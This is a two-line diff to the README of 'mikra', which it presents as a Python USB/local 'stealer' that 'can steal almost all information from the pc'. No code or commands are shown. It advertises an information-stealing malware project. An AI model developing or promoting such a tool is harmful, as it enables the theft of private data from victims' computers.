@@ -1,6 +1,6 @@
 __mikra__
 ===
-Simple stealer on python
+mikra - usb/local stealer, that can steal almost all information from the pc
 
 What can mikra
 ----
